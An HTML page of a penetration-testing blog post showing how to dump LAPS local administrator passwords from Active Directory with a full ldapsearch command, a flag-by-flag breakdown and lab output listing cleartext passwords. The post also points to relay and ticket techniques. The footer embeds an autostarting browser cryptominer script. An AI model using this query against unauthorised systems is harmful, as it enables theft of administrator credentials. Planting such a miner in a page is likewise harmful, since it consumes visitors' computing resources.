<!DOCTYPE html>
<html>

    <head>
        <title> Dump LAPS passwords with ldapsearch &middot;  </title>

        <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="generator" content="Hugo 0.31.1" />


<script   src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>


<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">

<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>


<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">


<link rel="stylesheet" href="https://malicious.link/css/nix.css">


<link href="https://fonts.googleapis.com/css?family=Inconsolata|Open+Sans|Roboto|Montserrat|Concert+One" rel="stylesheet">



<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
		  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
		  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
				  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-198967-1', 'auto');
	  ga('send', 'pageview');

</script>


    </head>

    <body>
        <header>
<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
	<div class="container-fluid">
		<div class="navbar-header">
			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
				<span class="sr-only">Toggle navigation</span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
			</button>
			<a class="navbar-brand" id="green-terminal" href=https://malicious.link/>mubix@malicious.link ~ $</a>
		</div>

		
		<div class="collapse navbar-collapse" id="navbar-collapse-1">
			<ul class="nav navbar-nav navbar-right">
				<li>
					<a href="https://malicious.link/">/home/mubix</a>
				</li>

				
				
				<li >
					<a href="/brandon">~/brandon</a>
				</li>
				
				
				<li >
					<a href="/about">~/about</a>
				</li>
				
				
				<li >
					<a href="/post">~/posts</a>
				</li>
				

			</ul>
		</div>
	</div>
</nav>
</header>

        <div class="container wrapper">
            <h1><a href="https://malicious.link/post/2017/dump-laps-passwords-with-ldapsearch/">Dump LAPS passwords with ldapsearch</a></h1>
            <span class="post-date">Jul 24, 2017 </span>
            <div class="post-content">
                <p><img src="/images/2017/ldapsearch_laps_rights.png" alt="" /></p>

<p>If you&rsquo;ve ever been pentesting an organization that had LAPS, you know that it is the best solution for randomizing local administrator passwords on the planet. (You should just be leaving them disabled).</p>

<p>LAPS stores it&rsquo;s information in Active Directory:</p>

<ul>
<li><p>The expiration time: <code>ms-Mcs-AdmPwdExpirationTime: 131461867015760024</code></p></li>

<li><p>And the actual password in clear text: <code>ms-Mcs-AdmPwd: %v!e#7S#{s})+y2yS#(</code></p></li>
</ul>

<p>When LAPS first came it, any user in Active Directory could read it. Microsoft fixed that, you now have to have the <code>All extended rights</code> permission to the object or Full Control of it.</p>

<p>In many organizations, there are pockets of <strong>OU</strong> admins, or even standard users that are in charge of a specific set of Users and (in particular) computers in which they have full control over.</p>

<p>There is already a Metasploit module thanks to <a href="https://github.com/Meatballs1">Meatballs</a>:
<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/enum_laps.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/enum_laps.rb</a>. But, unfortunately I don&rsquo;t always have access to a Meterpreter session to run the module.</p>

<p>Using <code>ldapsearch</code> (which is included in the package <code>ldapscripts</code> on Debian/Ubuntu) can be used to make the same query that the module does. Here is an example run:</p>

<pre><code>ldapsearch -x -h 192.168.80.10 -D \
&quot;helpdesk&quot; -w ASDqwe123 -b &quot;dc=sittingduck,dc=info&quot; \
&quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwd
</code></pre>

<p>Lets break this down:</p>

<ul>
<li><code>-x</code> - Use basic authentication</li>
<li><code>-h 192.168.80.10</code> - Connect to the Domain Controller for ldap</li>
<li><code>-D &quot;helpdesk&quot; -w ASDqwe123</code> - Login as the <code>helpdesk</code> user, with the password <code>ASDqwe123</code></li>
<li><code>-b &quot;dc=sittingduck,dc=info&quot;</code> - This loads the base LDAP object of the entire domain.</li>
<li><code>&quot;(ms-MCS-AdmPwd=*)&quot;</code> - Filter out any objects that I can&rsquo;t see a value for <code>ms-MCS-AdmPwd</code> for. (If you have rights as that user to see even one Administrator password, this will show it.)</li>
<li><code>ms-MCS-AdmPwd</code> - Only show me the <code>ms-MCS-AdmPwd</code> object (which by default includes the object name and DN so you will still know what host it belongs to)</li>
</ul>

<p>What does that look like?</p>

<pre><code>$ ldapsearch -x -h 192.168.80.10 -D &quot;helpdesk&quot; -w ASDqwe123 -b &quot;dc=sittingduck,dc=info&quot; &quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwd
# extended LDIF
#
# LDAPv3
# base &lt;dc=sittingduck,dc=info&gt; with scope subtree
# filter: (ms-MCS-AdmPwd=*)
# requesting: ms-MCS-AdmPwd
#

# DC1, Domain Controllers, sittingduck.info
dn: CN=DC1,OU=Domain Controllers,DC=sittingduck,DC=info
ms-Mcs-AdmPwd: 2F1i/++N0H+G]{Y&amp;,F

# SDCLIENT_DAWIN7, LabComputers, Lab, sittingduck.info
dn: CN=SDCLIENT_DAWIN7,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info
ms-Mcs-AdmPwd: 8CDR4,2UE8BA{zw2@RR

# SD_WSUS_2012, LabComputers, Lab, sittingduck.info
dn: CN=SD_WSUS_2012,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info
ms-Mcs-AdmPwd: +3!UY5@g9B.64RV2z/T

# WIN-PM0ID6F0AHN, LabComputers, Lab, sittingduck.info
dn: CN=WIN-PM0ID6F0AHN,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info
ms-Mcs-AdmPwd: %v!e#7S#{s})+y2yS#(

# search reference
ref: ldap://research.sittingduck.info/DC=research,DC=sittingduck,DC=info

# search reference
ref: ldap://ForestDnsZones.sittingduck.info/DC=ForestDnsZones,DC=sittingduck,D
 C=info

# search reference
ref: ldap://DomainDnsZones.sittingduck.info/DC=DomainDnsZones,DC=sittingduck,D
 C=info

# search reference
ref: ldap://sittingduck.info/CN=Configuration,DC=sittingduck,DC=info

# search result
search: 2
result: 0 Success
</code></pre>

<p>Now, just having the local admin password doesn&rsquo;t ensure that it&rsquo;s enabled, but there is a good bet that you are good to go now.</p>

<p><strong>P.S.</strong> You can also authenticate using Kerberos (think Golden/Silver tickets)</p>

<p><strong>P.P.S</strong> Because Windows doesn&rsquo;t (to the best of my knowledge) require signing on Domain Controllers for LDAP connections yet (probably does in 2016 or will soon), with a little bit of coding you can get <a href="https://github.com/CoreSecurity/impacket/blob/master/examples/ntlmrelayx.py">ntlmrelayx</a> to dump LAPS passwords ;-)</p>

            </div>
            
            <div class="post-comments">
                
            </div>
            
            <div class="push"></div>
        </div>
        <footer class="footer text-center">
<p>
	<center>
	<b>If you wish to support this blog, please consider clicking start for a little bit. Thanks!</b>
	<br />
	<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
	<div class="coinhive-miner"
	style="width: 800px; height: 80px"
	data-key="Fq2psjl0HfUkdM4LuKrCulHymNpmFuXb"
	data-whitelabel="true"
	data-text="#000000"
	data-background="#F5F5F5"
	data-user="blog"
	data-autostart="true"
	>
	<em>Loading...</em>
	</div>
	</center>
</p>
<p>Copyright &copy; 2018 Malicious.Link -
<span class="credit">
	Powered by
	<a target="_blank" href="https://gohugo.io">Hugo</a>
	and
	<a target="_blank" href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme.
</span>
</p>

</footer>

    </body>
